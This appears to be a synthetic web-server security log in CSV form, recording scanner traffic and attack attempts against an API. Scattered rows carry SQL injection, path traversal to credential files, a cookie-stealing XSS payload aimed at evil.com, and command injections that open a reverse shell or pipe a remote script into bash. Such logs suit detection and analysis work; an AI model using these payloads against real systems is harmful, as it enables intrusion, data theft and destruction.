event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
dede7267-c80e-4771-a3a8-1b98e30d8e36,2024-12-02T06:39:58.888847Z,HTTP_REQUEST,194.26.192.64,masscan/1.3.2,/api/search,POST,"id=' UNION SELECT username,password FROM users --",,,,,,,403,1590
2d0b48d9-ca36-4f4c-84bf-72f01b6cdca4,2024-12-02T06:55:53.319157Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/users,POST,id='; DROP TABLE users; --,,,,,,,500,1769
900a7aa1-541f-4b0c-b2f4-227cb8c01082,2024-12-02T07:45:32.623951Z,HTTP_REQUEST,193.32.162.159,gobuster/3.5,/files/..\..\..\windows\system32\config\sam,GET,,,,,,,,404,21
29c8dee4-b68e-48dd-8569-80294ac56808,2024-12-02T07:57:03.177428Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/contact,GET,,,,,,,,503,47
e718ab69-436d-449b-a7f6-a4c9f3de8a16,2024-12-02T07:57:03.673010Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/api/analytics,GET,,,,,,,,200,24
82f100b8-14bf-4407-98ad-ac2b63e3c40a,2024-12-02T07:57:05.249282Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/api/dashboard,GET,,,,,,,,429,40
214c840c-0681-4e4f-afea-ec2f20bfddf2,2024-12-02T07:57:05.261981Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/analytics,GET,,,,,,,,503,7
981ad933-4641-4bc2-8ad7-97157af66e00,2024-12-02T07:57:06.414385Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/users,GET,,,,,,,,503,37
46af3c41-7b73-45d3-909e-fa1650f6b399,2024-12-02T07:57:07.115366Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/settings,GET,,,,,,,,503,21
4536407f-d068-4b0d-b54e-7712374eb094,2024-12-02T07:57:08.494671Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/reports,GET,,,,,,,,429,42
be891ef9-62ff-4ece-8147-8e91232db886,2024-12-02T07:57:08.498772Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/search,GET,,,,,,,,503,38
e44d5991-a386-4ccd-a374-04b377b70b18,2024-12-02T07:57:09.492357Z,HTTP_REQUEST,5.188.206.13,,/api/settings,GET,,,,,,,,200,22
40583bda-e06e-4822-b91a-34c1e244ec49,2024-12-02T07:57:09.923464Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/about,GET,,,,,,,,200,24
c1c1a216-c822-47c9-b11d-ed9ac2db0d2b,2024-12-02T07:57:10.564471Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/search,GET,,,,,,,,200,24
2ac56240-5b6d-4b16-94ae-17a5f6724877,2024-12-02T07:57:10.917708Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/about,GET,,,,,,,,503,21
69a46b2b-4295-4e97-80cc-37a7dfd8e0b3,2024-12-02T07:57:11.089700Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/login,GET,,,,,,,,429,23
27e0729a-7904-4ef9-b09a-dbeb83a6b86a,2024-12-02T07:57:14.451255Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/analytics,GET,,,,,,,,200,45
ea14e81f-9568-4ae6-8cbf-37f86c3d7b93,2024-12-02T07:57:15.540121Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/profile,GET,,,,,,,,200,17
2d0ede05-e99c-4613-8d06-d63103ee14e7,2024-12-02T07:57:15.839240Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/logout,GET,,,,,,,,503,16
853ae024-4417-4898-b700-7ff7d5cccb32,2024-12-02T07:57:15.841459Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/search,GET,,,,,,,,503,25
107b0fac-6dd3-434b-ab52-657e51269fdd,2024-12-02T07:57:15.887222Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/contact,GET,,,,,,,,503,42
3bb303ab-88c5-4c1c-bc50-28405e9fec19,2024-12-02T07:57:15.901010Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/docs,GET,,,,,,,,200,49
0d836f27-fd64-416d-a8d9-e49fcf23138f,2024-12-02T07:57:16.328378Z,HTTP_REQUEST,5.188.206.13,,/help,GET,,,,,,,,200,32
67c85fcd-6138-4887-bc2b-3d6d8b2d0970,2024-12-02T07:57:16.648918Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/help,GET,,,,,,,,503,20
00abe1a8-72b1-423c-924a-f8dd71be2155,2024-12-02T07:57:16.714116Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/reports,GET,,,,,,,,429,50
1465c529-3acb-484f-b1f1-b76575940ed2,2024-12-02T07:57:16.981936Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/api/products,GET,,,,,,,,429,33
ddb846a1-98ac-4033-96b6-c80d0676b75a,2024-12-02T07:57:17.006115Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/api/products,GET,,,,,,,,429,16
8c2cf38d-c0b8-4d23-af9b-3f49196d6f33,2024-12-02T07:57:18.024246Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/home,GET,,,,,,,,200,23
aa1bd875-b829-4550-832d-e1fda8feeeb3,2024-12-02T07:57:18.431958Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/about,GET,,,,,,,,200,38
d89aacb6-4202-45b9-8463-ddac8d156a30,2024-12-02T07:57:18.489863Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/search,GET,,,,,,,,200,16
146f45b0-0586-45e6-a688-127d3286d655,2024-12-02T07:57:18.691661Z,HTTP_REQUEST,5.188.206.13,,/api/profile,GET,,,,,,,,429,25
f36f44b7-095e-4224-8dfc-bc5569c9300d,2024-12-02T07:57:18.804206Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/products,GET,,,,,,,,200,29
0e10166b-5007-45ef-9288-be81c91adee9,2024-12-02T07:57:19.710177Z,HTTP_REQUEST,5.188.206.13,,/home,GET,,,,,,,,429,7
1ea453d1-15b8-4039-ad85-7318e4a2918c,2024-12-02T07:57:20.753089Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/login,GET,,,,,,,,200,13
589b5330-94f5-4ab9-babb-ff5be733a20f,2024-12-02T07:57:20.793675Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/dashboard,GET,,,,,,,,503,49
27651e02-983e-4503-bddf-501479626bda,2024-12-02T07:57:20.960897Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/about,GET,,,,,,,,200,31
7bbed8c0-376f-4042-9a0d-48176c9b3e9e,2024-12-02T07:57:21.153469Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/search,GET,,,,,,,,200,36
f0821256-d431-4cfb-9233-9e1744629402,2024-12-02T07:57:21.345768Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/logout,GET,,,,,,,,429,38
06129565-5d12-4fd7-ab07-9f39df3603cb,2024-12-02T07:57:21.743283Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/api/analytics,GET,,,,,,,,503,5
1820aa28-4734-4dc5-b6aa-fc71d1e6de03,2024-12-02T07:57:22.099277Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/orders,GET,,,,,,,,200,40
651b3ba7-7acf-48cb-9659-48c07aa2ce1a,2024-12-02T07:57:22.340578Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/logout,GET,,,,,,,,429,23
02e57830-6bcb-484e-9e39-0a7ab106fb33,2024-12-02T07:57:23.284493Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/contact,GET,,,,,,,,429,13
51b09deb-ba7a-40d9-a47b-4f24f222fbc5,2024-12-02T07:57:23.839925Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/products,GET,,,,,,,,429,24
016e016d-e8d6-4fc3-912c-f7db904d1826,2024-12-02T07:57:24.429893Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/api/products,GET,,,,,,,,200,49
167e53e0-a6c1-4fc1-a7b8-b78e1ffb3ac2,2024-12-02T07:57:24.827791Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/orders,GET,,,,,,,,200,44
273db0fc-0971-4b6e-9105-ff4081b86442,2024-12-02T07:57:25.294595Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/docs,GET,,,,,,,,503,25
29a7da8e-1921-4624-95a0-20eae956def7,2024-12-02T07:57:25.412842Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/about,GET,,,,,,,,503,18
1e4f341e-e147-4252-bc03-5a1987e2bd30,2024-12-02T07:57:26.585947Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/users,GET,,,,,,,,503,31
60f36ebd-2423-4833-955d-64c2b4d93ae9,2024-12-02T07:57:26.680860Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/help,GET,,,,,,,,200,1
20436f6d-9e13-424f-89d1-268235078e3f,2024-12-02T07:57:26.947402Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/dashboard,GET,,,,,,,,429,43
e7df0a60-0f44-43d8-aa15-3f5135f1cdc7,2024-12-02T07:57:26.953380Z,HTTP_REQUEST,5.188.206.13,,/api/orders,GET,,,,,,,,429,19
24c61236-ef42-4d74-acb1-9c14372723f2,2024-12-02T07:57:27.968665Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/products,GET,,,,,,,,503,7
462786d3-c934-4f2e-aa5d-0232d29e7387,2024-12-02T07:57:29.576126Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/orders,GET,,,,,,,,503,46
ba4f7c5c-edc3-4fe1-a8da-1f88e75f5daa,2024-12-02T07:57:29.923283Z,HTTP_REQUEST,5.188.206.13,,/api/reports,GET,,,,,,,,200,25
2dc62c04-9f30-4169-8307-05e892c7d869,2024-12-02T07:57:30.393841Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/logout,GET,,,,,,,,503,42
8caf3021-6ef5-4cd0-9f72-7b7c862bd728,2024-12-02T07:57:31.412334Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/profile,GET,,,,,,,,200,12
e44acdb1-6374-45cf-9bc8-622f4806a931,2024-12-02T07:57:31.583687Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/login,GET,,,,,,,,503,5
ca431d66-eba3-4990-b763-b7bdcae11c3f,2024-12-02T07:57:31.741503Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/users,GET,,,,,,,,503,16
95f131a7-23ef-4510-bb66-ae6ca0e7985f,2024-12-02T07:57:32.772376Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/analytics,GET,,,,,,,,200,40
b73f1106-e814-480c-a6e4-52944e4f89f6,2024-12-02T07:57:34.451167Z,HTTP_REQUEST,5.188.206.13,,/api/analytics,GET,,,,,,,,200,6
d76c1421-6f2b-40a6-b279-8d4039500fea,2024-12-02T07:57:35.144471Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/contact,GET,,,,,,,,503,32
39972577-db06-40ea-a9b2-0f7a8f73ea4f,2024-12-02T07:57:36.116823Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/analytics,GET,,,,,,,,429,22
b884237a-a486-4bec-87a9-9800edcebbcf,2024-12-02T07:57:37.028510Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/about,GET,,,,,,,,503,25
d2c2e0e9-e65c-408a-a32e-7eec17f01cfc,2024-12-02T07:57:37.983369Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/contact,GET,,,,,,,,200,40
96be192f-796b-4452-b058-1dafeaf57638,2024-12-02T07:57:39.838755Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/api/notifications,GET,,,,,,,,429,11
a94c7012-5ec3-49c7-8ae5-b1778ede5572,2024-12-02T07:57:41.576345Z,HTTP_REQUEST,5.188.206.13,,/help,GET,,,,,,,,429,19
7e482a3a-fd3c-4f54-8854-a1611ccf1906,2024-12-02T07:57:43.381079Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/analytics,GET,,,,,,,,200,20
77633358-c119-43dc-b59a-3afa11a216a9,2024-12-02T07:57:43.402989Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/orders,GET,,,,,,,,429,12
64844e27-5fa1-467d-80a9-c9552ffbd068,2024-12-02T07:57:44.634973Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/about,GET,,,,,,,,429,22
b43908fe-4059-4cd8-b344-f9b0e178f217,2024-12-02T07:57:45.118292Z,HTTP_REQUEST,5.188.206.13,masscan/1.3.2,/login,GET,,,,,,,,200,8
4bcfb783-78f0-4292-ab95-fdd34f28c789,2024-12-02T07:57:45.666333Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/notifications,GET,,,,,,,,200,21
0ba9efc9-7370-4d50-9d64-05060f9085f2,2024-12-02T07:57:45.961912Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/api/products,GET,,,,,,,,429,47
a3bd3b53-960c-43b0-9d0e-c14a64f1dfe4,2024-12-02T07:57:46.878802Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/login,GET,,,,,,,,429,31
afcfdcc5-285b-453b-9b27-000c1e5e1171,2024-12-02T07:57:47.562179Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/home,GET,,,,,,,,503,41
602d7e1c-8aff-4709-9e55-94949909780a,2024-12-02T07:57:47.607145Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/api/analytics,GET,,,,,,,,200,30
952c6759-c6c8-43d1-bd25-9b9de7a98ac8,2024-12-02T07:57:48.667949Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/dashboard,GET,,,,,,,,200,30
7a63f8a0-76fd-4345-b875-b4240b4683a4,2024-12-02T07:57:48.673519Z,HTTP_REQUEST,5.188.206.13,,/login,GET,,,,,,,,200,28
53c35e87-d827-4120-86df-21f1934da4e1,2024-12-02T07:57:51.237102Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/login,GET,,,,,,,,200,48
a3c0a840-e40f-4bc9-b40a-abdc9d2d7dc7,2024-12-02T07:57:51.718827Z,HTTP_REQUEST,5.188.206.13,,/api/users,GET,,,,,,,,503,21
0ca98e55-9ae5-4659-ba4b-7517246787a4,2024-12-02T07:57:51.909875Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/help,GET,,,,,,,,503,48
e9cdbdb0-74d9-4d9d-b9a3-98a753055f63,2024-12-02T07:57:53.194888Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/help,GET,,,,,,,,200,41
12d5346c-7a2a-48dc-985f-c4fae7ab44ea,2024-12-02T07:57:53.232754Z,HTTP_REQUEST,5.188.206.13,,/help,GET,,,,,,,,200,48
33346090-a75f-4afa-9154-7a470f9b8de2,2024-12-02T07:57:54.030653Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/orders,GET,,,,,,,,200,11
6fde3865-748b-4cbc-b32d-145bb3c36333,2024-12-02T07:57:54.095994Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/orders,GET,,,,,,,,503,11
bb1f9d79-f939-48b9-b2e3-c5953624466c,2024-12-02T07:57:55.385731Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/dashboard,GET,,,,,,,,503,4
85f46acb-cf33-471c-9f50-a45901a9d0d5,2024-12-02T07:57:55.560488Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/api/reports,GET,,,,,,,,429,24
a957a5d4-d12d-4d90-96bc-13fb272c7c50,2024-12-02T07:57:56.328428Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/search,GET,,,,,,,,429,24
5e56ce0b-0656-456a-a0ba-b17d0a952ecc,2024-12-02T07:57:56.487115Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/api/profile,GET,,,,,,,,503,39
d9dc8b49-9e7d-4c1f-a98f-375813db6bde,2024-12-02T07:57:56.577632Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/products,GET,,,,,,,,200,16
60f959aa-7b74-4155-864a-86379b345ffb,2024-12-02T07:57:56.885245Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/home,GET,,,,,,,,200,21
6ff46699-0314-42a1-ac82-ef76c0eb028d,2024-12-02T07:57:57.622995Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/api/orders,GET,,,,,,,,429,29
74db2938-972b-4047-91bb-960717d6452c,2024-12-02T07:57:58.015340Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/notifications,GET,,,,,,,,200,29
9acdfd24-39bb-450a-8c51-cb6c3f694eaa,2024-12-02T07:57:58.029964Z,HTTP_REQUEST,5.188.206.13,sqlmap/1.7.2#stable (https://sqlmap.org),/api/analytics,GET,,,,,,,,429,24
967269f5-be02-4468-be35-9e7380a018ac,2024-12-02T07:57:58.465540Z,HTTP_REQUEST,5.188.206.13,gobuster/3.5,/home,GET,,,,,,,,200,6
9bfeb7dc-7da0-45d8-9daf-1846d0fc4711,2024-12-02T07:57:59.168442Z,HTTP_REQUEST,5.188.206.13,Nikto/2.5.0,/api/reports,GET,,,,,,,,503,34
66cdd738-8e77-460a-bbeb-e3e6510452e4,2024-12-02T07:57:59.296912Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/about,GET,,,,,,,,200,42
2dee70d1-fbd4-496b-b74c-11a05e4ad202,2024-12-02T07:57:59.688254Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/contact,GET,,,,,,,,503,5
e9a683bd-ca70-4c70-8dac-308d6dafe8d5,2024-12-02T07:57:59.906873Z,HTTP_REQUEST,5.188.206.13,python-requests/2.28.1,/about,GET,,,,,,,,200,26
1bf76277-e6de-43ef-8e92-cdee68a3cc13,2024-12-02T07:58:00.125250Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/login,GET,,,,,,,,200,6
3372bb2c-e8cf-45e1-8a10-06971aff1879,2024-12-02T07:58:01.148638Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/users,GET,,,,,,,,200,5
eef32d06-3600-40cf-9136-2e0d65b0b22d,2024-12-02T07:58:01.596374Z,HTTP_REQUEST,5.188.206.13,curl/7.68.0,/help,GET,,,,,,,,429,35
7276f5ef-d692-47db-b1ea-8fa8d67c87d1,2024-12-02T07:58:01.842088Z,HTTP_REQUEST,5.188.206.13,Wget/1.21.1,/api/notifications,GET,,,,,,,,200,19
0e4a3f8f-0131-4d58-8b53-9e00af1b1109,2024-12-02T07:58:03.112306Z,HTTP_REQUEST,5.188.206.13,Nmap Scripting Engine,/api/search,GET,,,,,,,,503,6
8d775b56-0ec6-421b-9c22-e00a8dfa1c3c,2024-12-02T08:34:40.442244Z,HTTP_REQUEST,209.141.47.245,Nmap Scripting Engine,/files/..%252f..%252f..%252fetc/passwd,GET,,,,,,,,200,30
bd958142-a2d9-446a-8fd2-1e83420a0364,2024-12-02T09:05:55.451759Z,HTTP_REQUEST,209.141.47.245,masscan/1.3.2,/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/auth.log,GET,,,,,,,,403,40
50ea548a-1125-42bb-a432-ddb2539e4724,2024-12-02T09:10:33.932930Z,HTTP_REQUEST,193.32.162.159,sqlmap/1.7.2#stable (https://sqlmap.org),/api/search,POST,id=1; SELECT * FROM information_schema.tables,,,,,,,500,1419
a584343a-564e-4978-89fd-6ede793a7c74,2024-12-02T09:12:26.346812Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,POST,comment=<svg onload=fetch('http://evil.com/steal?c='+document.cookie)>,,,,,,,400,100
5a102c28-17b6-468f-b5b8-b2af3cfda943,2024-12-02T09:28:49.397348Z,HTTP_REQUEST,89.248.167.131,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/products,POST,id=1' OR '1'='1' --,,,,,,,403,571
da042a9a-0122-4306-9754-c0a3c8639925,2024-12-02T10:39:47.800911Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/comments,GET,comment=<svg onload=fetch('http://evil.com/steal?c='+document.cookie)>,,,,,,,200,25
6f7eda28-7dfe-48bf-b72d-bc18180e21e6,2024-12-02T11:09:06.942101Z,HTTP_REQUEST,185.156.73.54,gobuster/3.5,/api/users,POST,search='; DROP TABLE users; --,,,,,,,200,574
583826d9-0700-44a7-9d72-85bf8a8e9b95,2024-12-02T11:10:41.923591Z,HTTP_REQUEST,23.129.64.100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users,GET,id=' OR '1'='1,,,,,,,500,1928
afd5e7d3-4349-4638-b1f3-8bc1db2dd726,2024-12-02T11:23:21.732731Z,HTTP_REQUEST,103.75.201.4,Nikto/2.5.0,/api/health,GET,host=localhost| nc -e /bin/sh attacker.com 4444,,,,,,,403,4532
605e6c1d-749f-4719-8256-eaf5a6d4b076,2024-12-02T12:21:34.310292Z,HTTP_REQUEST,91.92.109.87,Nmap Scripting Engine,/api/ping,GET,host=localhost& powershell -enc JABjAD0=,,,,,,,200,208
214f36d4-b736-4bb9-8566-4800c4a8fa2c,2024-12-02T13:00:28.971002Z,HTTP_REQUEST,193.32.162.159,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/keys,GET,,,,,,,,401,75
907f5cd6-3145-40c5-a3e2-ba5684373411,2024-12-02T13:15:05.601270Z,HTTP_REQUEST,91.240.118.172,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/phpmyadmin,POST,,,,,,,,403,73
69c522da-4e10-4255-82ab-78bf6d176359,2024-12-02T15:10:49.967620Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,GET,comment=<svg onload=fetch('http://evil.com/steal?c='+document.cookie)>,,,,,,,400,139
17efc838-af0b-4342-a55a-f9534c596631,2024-12-02T16:05:14.854850Z,HTTP_REQUEST,185.220.101.45,Nikto/2.5.0,/files/..%252f..%252f..%252fetc/passwd,GET,,,,,,,,500,50
acb59589-2763-4c93-bd50-4799a6fd1ffc,2024-12-02T16:35:07.805870Z,HTTP_REQUEST,185.156.73.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users/delete,POST,,,,,,,,200,83
ca4c2916-69eb-4778-9781-9f5568817bc8,2024-12-02T16:42:24.940103Z,HTTP_REQUEST,23.129.64.100,Nmap Scripting Engine,/api/export,GET,,,,,,,,403,24
8f4f6c68-37be-4b33-9eee-0efdb9ae155b,2024-12-02T16:52:35.122012Z,HTTP_REQUEST,103.75.201.4,Nmap Scripting Engine,/files/....//....//....//etc/shadow,GET,,,,,,,,200,5
680ba62a-240d-48ff-a922-366987935101,2024-12-02T17:14:27.820288Z,HTTP_REQUEST,195.54.160.149,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/orders,GET,"id=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",,,,,,,403,171
3d768dcd-18bb-48b8-9cf7-1244b89597c8,2024-12-02T17:15:46.128889Z,HTTP_REQUEST,194.26.192.64,gobuster/3.5,/api/users,GET,id='; EXEC xp_cmdshell('whoami'); --,,,,,,,200,15
13a87521-5660-4c28-80d1-6926eb7b7123,2024-12-02T17:15:52.885991Z,HTTP_REQUEST,91.240.118.172,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/secrets,GET,,,,,,,,200,89
e13c0d92-11e1-40c6-98a5-8191f0fc1363,2024-12-02T17:36:10.578640Z,HTTP_REQUEST,45.155.205.233,sqlmap/1.7.2#stable (https://sqlmap.org),/api/ping,GET,host=localhost`curl http://evil.com/malware.sh | bash`,,,,,,,403,1076
